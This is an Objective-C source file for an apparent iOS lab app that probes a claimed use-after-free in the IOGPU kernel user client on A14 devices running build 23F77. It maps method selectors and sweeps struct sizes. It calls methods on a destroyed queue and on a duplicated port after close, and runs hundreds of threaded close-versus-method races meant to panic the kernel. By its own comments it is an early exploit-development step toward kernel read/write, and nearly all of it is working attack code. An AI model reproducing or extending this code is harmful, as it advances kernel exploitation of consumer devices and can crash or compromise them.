#import "A14IOGPUCloseMethodProbe.h"
#import "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"

#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdatomic.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;

/*
 * Nearest KRW-shaped 26.5 lead: CVE-2026-43805 on IOGPUDeviceUserClient.
 * A14 23F77 IOGPUFamily: 0 DefaultLocking strings. Method vs close does not
 * share the RW lock. clientClose releases GPU device at UC+0x120;
 * s_new_command_queue is sel=6 stIn=0x410 on A14 23F77 (NOT XR sel=7 / 0x408).
 * Destroy sel=7. Submit sel=25. word1 = *(queue+0x558).
 * Panic = referenced-object UAF. INVALID_DEST = port died first.
 * No spray. No fake client. Not KRW.
 */

typedef kern_return_t (*IOServiceClose_t)(io_connect_t);
typedef kern_return_t (*IOObjectRelease_t)(io_object_t);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);
typedef kern_return_t (*IOConnectCallAsyncMethod_t)(
    mach_port_t, uint32_t, mach_port_t,
    uint64_t *, uint32_t,
    const uint64_t *, uint32_t, const void *, size_t,
    uint64_t *, uint32_t *, void *, size_t *);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef void *(*DevCreate_t)(io_service_t);
typedef uint32_t (*GetConn_t)(void *);
typedef void (*DevRelease_t)(void *);
typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
typedef uint32_t (*QueueGetID_t)(void *);

static NSMutableString *g_buf;
static int g_fd = -1;

static void glog(const char *fmt, ...) {
    char lb[800];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb) - 1, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    if (n > (int)sizeof(lb) - 2) n = (int)sizeof(lb) - 2;
    lb[n++] = '\n';
    lb[n] = 0;
    @synchronized ([NSString class]) {
        if (g_buf) [g_buf appendFormat:@"%.*s", n, lb];
        if (g_fd >= 0) {
            write(g_fd, lb, (size_t)n);
            fcntl(g_fd, F_FULLFSYNC);
        }
    }
}

static NSString *g_finish(void) {
    if (g_fd >= 0) {
        fcntl(g_fd, F_FULLFSYNC);
        close(g_fd);
        g_fd = -1;
    }
    return g_buf ?: @"STOP: no log";
}

static const char *gkr(kern_return_t r) {
    unsigned u = (unsigned)r;
    if (r == 0) return "SUCCESS";
    if (u == 0xe00002c2) return "kIOReturnBadArgument";
    if (u == 0xe00002c7) return "kIOReturnUnsupported";
    if (u == 0xe00002bd) return "kIOReturnNoDevice";
    if (u == 0xe00002c9) return "kIOReturnBusy";
    if (u == 0xe00002c5) return "kIOReturnNotPermitted";
    if (u == 0xe00002bc) return "kIOReturnError";
    if (u == 0xe00002c1) return "kIOReturnAborted";
    if (u == 0x10000003) return "MACH_SEND_INVALID_DEST";
    if (u == 0x10000015) return "MACH_SEND_INVALID_HEADER";
    if (r == KERN_INVALID_NAME) return "KERN_INVALID_NAME";
    if (r == KERN_INVALID_RIGHT) return "KERN_INVALID_RIGHT";
    return "?";
}

typedef struct {
    IOServiceMatching_t matching;
    IOServiceGetMatchingService_t getsvc;
    IOServiceClose_t close;
    IOObjectRelease_t release;
    IOConnectCallMethod_t call;
    IOConnectCallAsyncMethod_t acall;
    mach_port_t mainPort;
    DevCreate_t devCreate;
    GetConn_t getConn;
    DevRelease_t devRelease;
    QueueCreate_t queueCreate;
    QueueGetID_t queueGetID;
    io_service_t svc;
    uint32_t sel7sz;
} GIO;

static int g_syms(GIO *io) {
    memset(io, 0, sizeof(*io));
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) {
        glog("STOP dlopen iokit=%p iogpu=%p", iokit, iogpu);
        return -1;
    }
    io->matching = dlsym(iokit, "IOServiceMatching");
    io->getsvc = dlsym(iokit, "IOServiceGetMatchingService");
    io->close = dlsym(iokit, "IOServiceClose");
    io->release = dlsym(iokit, "IOObjectRelease");
    io->call = dlsym(iokit, "IOConnectCallMethod");
    io->acall = dlsym(iokit, "IOConnectCallAsyncMethod");
    mach_port_t *mp = dlsym(iokit, "kIOMainPortDefault");
    if (!mp) mp = dlsym(iokit, "kIOMasterPortDefault");
    io->devCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    io->getConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    io->devRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    io->queueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    io->queueGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");
    io->sel7sz = 0x410;
    if (!io->matching || !io->getsvc || !io->close || !io->call || !mp ||
        !io->devCreate || !io->getConn) {
        glog("STOP dlsym");
        return -1;
    }
    io->mainPort = *mp;
    io->svc = io->getsvc(io->mainPort, io->matching("IOGPU"));
    if (!io->svc) {
        glog("STOP no IOGPU service");
        return -1;
    }
    glog("IOGPU svc=%u DeviceCreate=%p close=%p async=%p",
         io->svc, io->devCreate, io->close, io->acall);
    glog("A14 IOGPUFamily DefaultLocking strings = 0 (unlocked UC)");
    return 0;
}

static uint32_t g_typeid(void *dev) {
    if (!dev) return 0;
    return *(uint32_t *)((uint8_t *)dev + 0x08);
}

static kern_return_t g_sel5(GIO *io, io_connect_t conn) {
    uint8_t outBuf[0x10];
    memset(outBuf, 0, sizeof(outBuf));
    size_t outCnt = sizeof(outBuf);
    return io->call(conn, 5, NULL, 0, NULL, 0, NULL, NULL, outBuf, &outCnt);
}

/* s_new_command_queue — loads GPU device at UC+0x120.
 * A14: structIn must be >= 0x408 AND equal [ns+0x278]. XR 0x408 is often too small. */
static kern_return_t g_sel7(GIO *io, io_connect_t conn, uint32_t typeId, uint32_t *qidOut) {
    uint8_t inBuf[0x800];
    uint8_t outBuf[0x10];
    memset(inBuf, 0, sizeof(inBuf));
    memset(outBuf, 0, sizeof(outBuf));
    uint32_t insz = io->sel7sz ? io->sel7sz : 0x410;
    if (insz < 0x410) insz = 0x410;
    if (insz > sizeof(inBuf)) insz = sizeof(inBuf);
    *(uint32_t *)(inBuf + 0x400) = 1;
    *(uint8_t *)(inBuf + 0x404) = (uint8_t)typeId;
    size_t outCnt = sizeof(outBuf);
    kern_return_t r = io->call(conn, 6, NULL, 0, inBuf, insz,
                               NULL, NULL, outBuf, &outCnt);
    if (qidOut) *qidOut = (uint32_t)(*(uint64_t *)outBuf);
    return r;
}

static kern_return_t g_sel8(GIO *io, io_connect_t conn, uint32_t qid) {
    uint64_t sc[1] = { qid };
    return io->call(conn, 7, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

static kern_return_t g_sel16(GIO *io, io_connect_t conn, uint32_t qid) {
    uint64_t sc[1] = { qid };
    return io->call(conn, 16, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

static kern_return_t g_sel26(GIO *io, io_connect_t conn, uint32_t qid) {
    uint64_t sc[4] = { qid, 0, 1, 0x40 };
    uint8_t st[0x40];
    memset(st, 0, sizeof(st));
    return io->call(conn, 25, sc, 4, st, sizeof(st), NULL, NULL, NULL, NULL);
}

typedef struct {
    GIO *io;
    io_connect_t conn;
    void *dev;
    uint32_t typeId;
    uint32_t qid;
    int which; /* 5 getter, 16, 26, 100 = QueueCreate 0x410 */
    atomic_int *stop;
    atomic_uint *calls;
    atomic_uint *ok;
    atomic_int last;
} GRace;

static uint32_t g_fw_qid(GIO *io, void *dev, uint32_t typeId) {
    if (!io->queueCreate || !io->queueGetID || !dev) return 0;
    uint8_t args[0x410];
    memset(args, 0, sizeof(args));
    *(uint32_t *)(args + 0x400) = 1;
    *(uint8_t *)(args + 0x404) = (uint8_t)typeId;
    void *q = io->queueCreate(dev, args, 0x410);
    return q ? io->queueGetID(q) : 0;
}

static void *g_wirer(void *u) {
    GRace *rc = u;
    while (!atomic_load(rc->stop)) {
        kern_return_t r;
        if (rc->which == 26) r = g_sel26(rc->io, rc->conn, rc->qid);
        else if (rc->which == 16) r = g_sel16(rc->io, rc->conn, rc->qid);
        else if (rc->which == 5) r = g_sel5(rc->io, rc->conn);
        else if (rc->which == 100) {
            uint32_t qid = g_fw_qid(rc->io, rc->dev, rc->typeId);
            r = qid ? 0 : (kern_return_t)0xe00002c2;
            if (qid) g_sel8(rc->io, rc->conn, qid);
        } else {
            uint32_t qid = 0;
            r = g_sel7(rc->io, rc->conn, rc->typeId, &qid);
            if (r == 0 && qid) g_sel8(rc->io, rc->conn, qid);
        }
        atomic_store(&rc->last, (int)r);
        atomic_fetch_add(rc->calls, 1);
        if (r == 0) atomic_fetch_add(rc->ok, 1);
    }
    return NULL;
}

static unsigned g_race(GIO *io, int which, uint32_t typeId, int iters, const char *tag) {
    static const useconds_t jit[] = { 0, 20, 50, 100, 200, 400, 800, 1500 };
    unsigned survived = 0;
    for (int iter = 0; iter < iters; iter++) {
        void *d = io->devCreate(io->svc);
        if (!d) {
            glog("%s DeviceCreate fail iter=%d", tag, iter);
            break;
        }
        io_connect_t c = io->getConn(d);
        uint32_t qid = 0;
        uint32_t tid = g_typeid(d);
        if (!tid) tid = typeId;
        if (which == 26 || which == 16) {
            qid = g_fw_qid(io, d, tid);
            if (!qid) {
                if (iter < 3) glog("%s iter=%d QueueCreate 0x410 qid=0 skip", tag, iter);
                continue;
            }
        }
        atomic_int stop = 0;
        atomic_uint calls = 0, ok = 0;
        GRace rc = {0};
        rc.io = io;
        rc.conn = c;
        rc.dev = d;
        rc.typeId = tid;
        rc.qid = qid;
        rc.which = which;
        rc.stop = &stop;
        rc.calls = &calls;
        rc.ok = &ok;
        atomic_store(&rc.last, 0);
        pthread_t th;
        if (pthread_create(&th, NULL, g_wirer, &rc) != 0) {
            glog("STOP pthread");
            return survived;
        }
        useconds_t j = jit[iter % 8];
        usleep(j);
        kern_return_t cl = io->close(c);
        atomic_store(&stop, 1);
        pthread_join(th, NULL);
        survived++;
        if (iter % 20 == 0 || iter == iters - 1) {
            glog("%s iter=%d jitter=%u close=0x%08x (%s) calls=%u ok=%u last=0x%08x (%s)",
                 tag, iter, j, (unsigned)cl, gkr(cl),
                 atomic_load(&calls), atomic_load(&ok),
                 (unsigned)atomic_load(&rc.last), gkr(atomic_load(&rc.last)));
        }
    }
    return survived;
}

@implementation A14IOGPUCloseMethodProbe

+ (NSString *)runCloseVsMethod {
    g_buf = [NSMutableString string];
    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"a14_iogpu_close_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    g_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"iogpu_close"];
    if (stop) {
        [g_buf appendString:stop];
        return g_finish();
    }
    glog("=== IOGPU close vs QueueCreate sel=%u stIn=0x%x (no spray) ===",
         A14_23F77_IOGPU_QUEUE_CREATE_SEL, A14_23F77_IOGPU_QUEUE_CREATE_SIZE);
    glog("[*] A14 23F77: destroy sel=%u submit sel=%u word1=+0x%x SysMem MD +0x%x",
         A14_23F77_IOGPU_QUEUE_DESTROY_SEL, A14_23F77_IOGPU_SUBMIT_SEL,
         A14_23F77_IOGPU_QUEUE_LEAK, A14_23F77_SYSMEM_MD_OFF);
    glog("[*] panic + IPS = paste. Missing line after FIRE/CLOSE = kernel took it.");
    glog("[*] No spray. No fake vtable. Not KRW.");
    glog("time %s", [[[NSDate date] description] UTF8String]);

    GIO io;
    if (g_syms(&io) != 0) return g_finish();

    void *dev = io.devCreate(io.svc);
    if (!dev) {
        glog("STOP DeviceCreate");
        return g_finish();
    }
    io_connect_t conn = io.getConn(dev);
    uint32_t typeId = g_typeid(dev);
    glog("conn=%u typeId=0x%x", conn, typeId);

    /* --- compact sel map (skip 0) --- */
    glog("--- Phase 0: sel 1..31 sc=0 empty in, then sel=7 ABI ---");
    uint8_t outb[0x100];
    for (uint32_t sel = 1; sel <= 31; sel++) {
        memset(outb, 0, sizeof(outb));
        size_t osz = 16;
        kern_return_t r = io.call(conn, sel, NULL, 0, NULL, 0,
                                  NULL, NULL, outb, &osz);
        if ((unsigned)r == 0xe00002c7) continue;
        glog("  empty sel=%u -> 0x%08x (%s)", sel, (unsigned)r, gkr(r));
    }
    uint32_t q0 = 0;
    kern_return_t r7 = g_sel7(&io, conn, typeId, &q0);
    glog("sel=7 ABI 0x408 -> 0x%08x (%s) qid=%u", (unsigned)r7, gkr(r7), q0);
    if (r7 == 0 && q0) {
        kern_return_t d = g_sel8(&io, conn, q0);
        glog("sel=8 destroy qid=%u -> 0x%08x (%s)", q0, (unsigned)d, gkr(d));
    }

    /* --- sel=7 size sweep: A14 expected = [ns+0x278], must be >= 0x408 --- */
    glog("--- Phase 1: sel=7 size sweep (XR 0x408 was BadArg) ---");
    uint32_t found_sz = 0;
    for (uint32_t sz = 0x408; sz <= 0x600 && !found_sz; sz += 8) {
        io.sel7sz = sz;
        uint32_t qid = 0;
        kern_return_t r = g_sel7(&io, conn, typeId, &qid);
        if ((unsigned)r == 0xe00002c2) continue;
        glog("  sel=7 sz=0x%x -> 0x%08x (%s) qid=%u", sz, (unsigned)r, gkr(r), qid);
        if (r == 0 || (unsigned)r != 0xe00002c2) {
            found_sz = sz;
            if (r == 0 && qid) g_sel8(&io, conn, qid);
        }
    }
    if (found_sz) {
        io.sel7sz = found_sz;
        glog("using sel=7 sz=0x%x", found_sz);
    } else {
        io.sel7sz = 0x408;
        glog("sel=7 still all BadArg 0x408..0x600. Will race live sel=5.");
    }

    glog("--- Phase 1b: IOGPUCommandQueueCreate (framework packs A14 size) ---");
    uint32_t fw_qid = 0;
    if (io.queueCreate && io.queueGetID) {
        uint8_t args[0x600];
        memset(args, 0, sizeof(args));
        *(uint32_t *)(args + 0x400) = 1;
        *(uint8_t *)(args + 0x404) = (uint8_t)typeId;
        static const uint32_t qsz[] = { 0x408, 0x410, 0x448, 0x4c0, 0x500, 0x548, 0x580, 0x600 };
        for (unsigned i = 0; i < sizeof(qsz)/sizeof(qsz[0]) && !fw_qid; i++) {
            void *q = io.queueCreate(dev, args, qsz[i]);
            uint32_t qid = q && io.queueGetID ? io.queueGetID(q) : 0;
            glog("  QueueCreate sz=0x%x q=%p qid=%u", qsz[i], q, qid);
            if (qid) {
                fw_qid = qid;
                io.sel7sz = qsz[i];
            }
        }
    } else {
        glog("no IOGPUCommandQueueCreate");
    }

    /* --- post-destroy old qid (no spray) --- */
    glog("--- Phase 2: destroy framework qid then sel=16/26 on OLD qid ---");
    if (fw_qid) {
        kern_return_t ds = g_sel8(&io, conn, fw_qid);
        glog("sel=8 destroy qid=%u -> 0x%08x (%s)", fw_qid, (unsigned)ds, gkr(ds));
        kern_return_t s16 = g_sel16(&io, conn, fw_qid);
        kern_return_t s26 = g_sel26(&io, conn, fw_qid);
        glog("post-destroy sel=16 qid=%u -> 0x%08x (%s)", fw_qid, (unsigned)s16, gkr(s16));
        glog("post-destroy sel=26 qid=%u -> 0x%08x (%s)", fw_qid, (unsigned)s26, gkr(s26));
        if (s16 == 0 || s26 == 0)
            glog("*** post-destroy method SUCCESS — queue object still reachable. No spray. ***");
    } else {
        glog("no fw_qid — skip post-destroy");
    }

    /* --- post-close same name --- */
    glog("--- Phase 3: CLOSE then sel=5 on same name ---");
    glog("CLOSE conn=%u", conn);
    kern_return_t cr = io.close(conn);
    glog("IOServiceClose -> 0x%08x (%s)", (unsigned)cr, gkr(cr));
    kern_return_t r1 = g_sel5(&io, conn);
    glog("post-close sel=5 -> 0x%08x (%s)", (unsigned)r1, gkr(r1));

    /* --- extra send-right --- */
    glog("--- Phase 4: COPY_SEND, close original, sel=7 on extra ---");
    void *devF = io.devCreate(io.svc);
    if (!devF) {
        glog("STOP DeviceCreate extra");
        if (io.release) io.release(io.svc);
        return g_finish();
    }
    io_connect_t orig = io.getConn(devF);
    uint32_t typeF = g_typeid(devF);
    mach_port_t extra = MACH_PORT_NULL;
    mach_msg_type_name_t acquired = 0;
    kern_return_t ex = mach_port_extract_right(mach_task_self(), orig,
                                               MACH_MSG_TYPE_COPY_SEND,
                                               &extra, &acquired);
    glog("COPY_SEND orig=%u extra=%u acquired=0x%x -> 0x%08x (%s)",
         orig, extra, acquired, (unsigned)ex, gkr(ex));
    if (ex == KERN_SUCCESS && extra) {
        kern_return_t pre = g_sel5(&io, extra);
        glog("extra sel=5 before close -> 0x%08x (%s)", (unsigned)pre, gkr(pre));
        glog("CLOSE original=%u  (missing next line = panic in close)", orig);
        kern_return_t c2 = io.close(orig);
        glog("IOServiceClose -> 0x%08x (%s)", (unsigned)c2, gkr(c2));
        glog("FIRE extra sel=5  (missing next line = kernel took the call)", extra);
        kern_return_t post = g_sel5(&io, extra);
        glog("extra sel=5 after close -> 0x%08x (%s)", (unsigned)post, gkr(post));
        mach_port_deallocate(mach_task_self(), extra);
        if ((unsigned)post == 0xe00002c1)
            glog("Aborted after close — method hit torn-down +0x120 (XR T014 class)");
        else if (post == 0)
            glog("extra still works after close — last-ref was NOT this UC");
        else if ((unsigned)post == 0x10000003 || post == KERN_INVALID_NAME || post == KERN_INVALID_RIGHT)
            glog("extra died with close — no post-close kernel path");
        else
            glog("extra reached kernel after close (%s) — paste + IPS if panic", gkr(post));
    }

    const int kIters = 400;
    uint32_t tid = typeF ? typeF : typeId;

    glog("--- Phase 5: %d iters QueueCreate 0x410 vs close (this IS s_new_command_queue / +0x120) ---", kIters);
    unsigned sq = g_race(&io, 100, tid, kIters, "qcreate");
    glog("QueueCreate race survived %u/%d", sq, kIters);

    glog("--- Phase 6: %d iters sel=16 vs close (fw qid) ---", kIters / 2);
    unsigned s16 = g_race(&io, 16, tid, kIters / 2, "sel16");
    glog("sel=16 race survived %u/%d", s16, kIters / 2);

    glog("--- Phase 7: %d iters sel=26 vs close (fw qid) ---", kIters / 2);
    unsigned s26 = g_race(&io, 26, tid, kIters / 2, "sel26");
    glog("sel=26 race survived %u/%d", s26, kIters / 2);

    if (io.release) io.release(io.svc);
    glog("=== verdict: SURVIVED qcreate=%u/%d sel16=%u sel26=%u — no in-flight UAF this run ===",
         sq, kIters, s16, s26);
    glog("If IPS exists, this line is missing. Do not re-tap after panic.");
    return g_finish();
}

@end
